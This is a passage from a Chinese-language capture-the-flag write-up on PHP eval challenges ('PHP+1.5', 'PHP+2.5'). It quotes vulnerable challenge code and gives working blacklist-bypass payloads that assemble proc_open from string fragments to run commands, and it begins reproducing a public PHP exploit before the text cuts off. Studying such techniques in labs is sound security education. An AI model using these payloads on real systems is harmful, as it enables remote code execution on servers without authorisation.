    $proc = proc_open("echo foo",
      array(
        array("pipe","r"),
        array("pipe","w"),
        array("pipe","w")
      ),
      $pipes);
    print stream_get_contents( $pipes[1] );
    // 输出为 foo
    ?>
这里要注意的是第2行的`$proc`必须存在，下面的这个例子运行就会报错：
在官方文档给的例子下，有人给出的解释是：
> It seems you actually have to store the return value in order for your
> streams to exist. You can’t throw it away.
也就是说为了让流存在，必须要存储返回值，不能把这个返回值丢掉。
所以直接将这个返回值赋给一个变量就可以了，这里的payload是赋给了`$ret`变量，然后用`fgets`输出内容：
    ?input=$desc=array(array('p'.'ipe','r'),array('p'.'ipe','w'),array('p'.'ipe','w'));$pxpes=array();eval('$ret=proc'.$thisfille[8].'open("/readFlag",$desc,$pxpes);');eval('print(fge'.'ts($pxpes[1]));');&thisfile=/lib/x86_64-linux-gnu
成功获得flag：
但是读取`/flag`却是没有回显的，猜测还是和权限有关，可以这样验证一下：
    ?input=$desc=array(array('p'.'ipe','r'),array('p'.'ipe','w'),array('p'.'ipe','w'));$pxpes=array();eval('$ret=proc'.$thisfille[8].'open("ls%20-al%20/readFlag",$desc,$pxpes);');eval('print(fge'.'ts($pxpes[1]));');&thisfile=/lib/x86_64-linux-gnu
得到的结果是：
    -r-s--x--x 1 root root 8608 May  6 07:52 /readFlag
而`ls -al /flag`可以发现，只有root用户才可以执行该文件，所以才会什么都没有返回：
    -r-------- 1 root root 8608 May  6 08:43 /flag
## PHP+1.5
然后看一下PHP+1的升级版，PHP+1.5
    ";
                return true;
                break;
            }
        }
        $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\{|\}|\"|\'";
        if (preg_match("/$blacklist/i", $input)) {
            echo "Do you really you need that?" . "";
            return true;
        }
        unset($blacklist);
        return false;
    }
    $thisfille = $_GET['thisfile'];
    if (is_file($thisfille)) {
        echo "You can't use inner file" . "";
    } else {
        if (file_exists($thisfille)) {
            if (check()) {
                echo "Naaah" . "";
            } else {
                eval($input);
            }
        } else {
            echo "File doesn't exist" . "";
        }
    }
    function iterate($ass)
    {
        foreach ($ass as $hole) {
            echo "AssHole";
        }
    }
    highlight_file(__FILE__);
    ?>
和前面一道的差别就是多了对`$input`的`$blacklist`检查，也就是说禁掉了`eval`函数：
所以上面这道题使用eval的解法已经不再适用了，但是php支持另一种看起来比较奇怪的字符串拼接方式：
可以看到，虽然有报错，但是还是执行了`phpinfo()`命令。
我们尝试一下读取phpinfo：
    ?input=$a=p.h.p.i.n.f.o;$a();&thisfile=/var
payload1：
    ?input=
    $x=ch.r;
    $y=$x(95);
    $z=$x(47);
    $a=p.r.o.c.$y.o.p.e.n;
    $b=$z.readFlag;
    $c=p.i.p.es;
    $d=p.i.p.e;
    $e=r;
    $f=w;
    $i=ne.xt;
    $h=str.eam.$y.ge.t.$y.con.tents;
    $k=$a($b,array(array($d,$e),array($d,$f),array($d,$f)),$$c);
    print($h($i($$c)));
    &thisfile=/var
稍微解释一下这个payload。$x是`chr`函数，$y是字符`_`，$z是字符`/`，用来拼接`/readFlag`用。
    $k=$a($b,array(array($d,$e),array($d,$f),array($d,$f)),$$c);
    // equivalent to
    $k=proc_open('/readFlag',array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
这里需要特别注意的是传入的是`$$c`，因为需要将`$pipes`变成一个变量，`$c`表示的仅仅是`pipes`，而不是`$pipes`。同样的，后面是
    print($h($i($$c)));
    // equivalent to
    print($stream_get_contents(next($pipes)));
另一个payload2，只是在提取`$pipes[1]`的时候有点区别：
    ?input=
    $x=ch.r;
    $y=$x(95);
    $z=$x(47);
    $a=p.r.o.c.$y.o.p.e.n;
    $b=$z.readFlag;
    $c=p.i.p.es;
    $d=p.i.p.e;
    $e=r;
    $f=w;
    $i=(arra).(y).$y.sh.ift;
    $j=(arr).(ay).$y.sl.ice;
    $h=str.eam.$y.ge.t.$y.con.tents;
    $k=$a($b,array(array($d,$e),array($d,$f),array($d,$f)),$$c);
    print($h($i($j($$c,1,2))));
    &thisfile=/var
## PHP+2.5
    //php2.5
    ";
              return true;
              break;
          }
      }
      $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\{|\}|\"|\'";
      if(preg_match("/$blacklist/i", $input)){
        echo "Do you really you need that?" . "";
        return true;
      }
      unset($blacklist);
      if(strlen($input)>100){  #That is random no. I took ;)
        echo "This is getting really large input..." . "";
        return true;
      }  
      return false;
    }
    $thisfille=$_GET['thisfile'];
    if(is_file($thisfille)){
      echo "You can't use inner file" . "";
    }
    else{
      if(file_exists($thisfille)){
        if(check()){
          echo "Naaah" . "";
        }else{
          eval($input);
        }
      }else{
        echo "File doesn't exist" . "";
      }
    }
    function iterate($ass){
        foreach($ass as $hole){
            echo "AssHole";
        }
    }
    highlight_file(__FILE__);
    ?>
在这道题的环境中，`proc_open`函数是没有被禁用的，它的预期解法呢是找到一个segmentation
fault，然后使用文件上传和条件竞争来获取shell。
可以采用现成的[exp](https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php)：
    >= 8;
          }
        }
        public function str2ptr(&$str, $p = 0, $s = 8) {
            $address = 0;
            for($j = $s-1; $j >= 0; $j--) {
                $address <<= 8;